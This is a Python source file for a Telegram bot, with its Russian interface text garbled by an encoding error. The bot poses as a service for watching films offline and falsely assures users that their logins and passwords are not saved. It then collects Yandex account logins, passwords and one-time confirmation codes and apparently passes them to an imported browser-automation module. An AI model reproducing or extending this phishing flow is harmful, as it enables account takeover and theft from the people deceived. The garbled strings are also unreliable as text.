import sys

from aiogram.types import Message
from aiogram import F, Router
from aiogram.fsm.context import FSMContext
from aiogram.filters import CommandStart, Command


from dotenv import load_dotenv

from keyboards.kb_client import kb_client_main, kb_log_in
from utils.states import LogState
from kin import selen


load_dotenv()
router = Router()

@router.message(Command('stop'))
async def stop(message: Message):
    await message.answer( "–û—Å—Ç–∞–Ω–æ–≤–∫–∞" )
    sys.exit(0)


@router.message(CommandStart())
async def start(message: Message):
    await message.answer(f"–ü—Ä–∏–≤–µ—Çüéâ! ÔøΩÔøΩ{message.from_user.first_name}ÔøΩÔøΩ –±–æ—Ç –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ —Ñ–∏–ª—å–º–æ–≤ –æ—Ñ–ª–∞–π–Ω üíº.\n\n"
                         "–í—Å–µ –ø–∞—Ä–æ–ª–∏ –∏ –ª–æ–≥–∏–Ω—ã –Ω–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è\n\n"
                         "–î–∞–Ω–Ω—ã–µ –æ—Å—Ç–∞—é—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ —á–∞—Ç–µ.\n–í—Å–µ –Ω–∞–¥–µ–∂–Ω–æ ü™ñ",
                         reply_markup=kb_client_main)

@router.message(F.text == '–í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é')
async def cancel_main(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("–í—ã –≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é", reply_markup=kb_client_main)


@router.message(F.text == '–ù–∞—á–∞—Ç—å –ø—Ä–æ—Å–º–æ—Ç—Ä')
async def start_view(message: Message, state: FSMContext):
    await state.set_state(LogState.view)
    await message.answer("–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Ñ–∏–ª—å–º –∏–ª–∏ —Å–µ—Ä–∏—é —Å–µ—Ä–∏–∞–ª–∞",)

@router.message(LogState.view)
async def view(message: Message, state: FSMContext):
    await message.answer("–°—Å—ã–ª–∫–∞ –Ω–∞ —Ñ–∏–ª—å–º –∏–ª–∏ —Å–µ—Ä–∏—é —Å–µ—Ä–∏–∞–ª–∞ –ø–æ–ª—É—á–µ–Ω–∞. –ó–∞–ø—É—Å–∫ —Ñ–∏–ª—å–º–∞ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è. –í—ã–±–µ—Ä–∏—Ç–µ –∫–∞–∫ –≤–æ–π—Ç–∏",
                         reply_markup=kb_log_in)
    await state.update_data(url_mes=message.text)
    await state.set_state(LogState.login)


@router.message(LogState.login, (F.text == "–ü–æ email/login") | (F.text == "–ü–æ —Ç–µ–ª–µ—Ñ–æ–Ω—É"))
async def but_text(message: Message, state: FSMContext):
    if message.text == "–ü–æ email/login":
        await message.answer(
            "–í–≤–µ–¥–∏—Ç–µ email/–ª–æ–≥–∏–Ω",
        )
        await state.set_state(LogState.email)
        print("email")
    elif message.text == "–ü–æ —Ç–µ–ª–µ—Ñ–æ–Ω—É":
        await message.answer(
            "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–ª–µ—Ñ–æ–Ω",
        )
        await state.set_state(LogState.phone)
        print("phone")


#–í—Ö–æ–¥ –ø–æ –º–∞–π–ª
@router.message(LogState.email)
async def req_passw(message: Message, state: FSMContext):
    await state.update_data(email_mes=message.text)
    await message.answer("–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å",)
    await state.set_state(LogState.passw)

@router.message(LogState.passw)
async def log_email_passw(message: Message, state: FSMContext):
    await state.update_data(pssw_mail=message.text)
    await state.set_state(LogState.code)
    await message.answer("–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è",)

@router.message(LogState.code)
async def one_time_code(message: Message, state: FSMContext):
    await state.update_data(one_code_mail=message.text)
    dt = await state.get_data()
    await message.answer(f"–î–∞–Ω–Ω—ã–µ –¥–ª—è –≤—Ö–æ–¥–∞ –≤ —è–Ω–¥–µ–∫—Å –∞–∫–∫–∞—É–Ω—Ç Mail - {dt['email_mes']}, –ü–∞—Ä–æ–ª—å - {dt['pssw_mail']}",)
    await state.clear()


#–í—Ö–æ–¥ –ø–æ —Ç–µ–ª–µ—Ñ–æ–Ω—É
@router.message(LogState.phone)
async def phone(message: Message, state: FSMContext):
    await state.update_data(phone=message.text)
    await message.answer("–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è",)
    await state.set_state(LogState.code_ph)
    
@router.message(LogState.code_ph)
async def phone_code(message: Message, state: FSMContext):
    await state.update_data(one_code_phone=message.text)
    await message.answer("–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å",)
    await state.set_state(LogState.passw_phone)
    
@router.message(LogState.passw_phone)
async def phone_psw(message: Message, state: FSMContext):
    await state.update_data(pssw_phone=message.text)
    dt = await state.get_data()
    await message.answer(f"–î–∞–Ω–Ω—ã–µ –¥–ª—è –≤—Ö–æ–¥–∞ –≤ —è–Ω–¥–µ–∫—Å –∞–∫–∫–∞—É–Ω—Ç –¢–µ–ª–µ—Ñ–æ–Ω - {dt['phone']}, –ü–∞—Ä–æ–ª—å - {dt['pssw_phone']}",)
    selen
    await state.clear()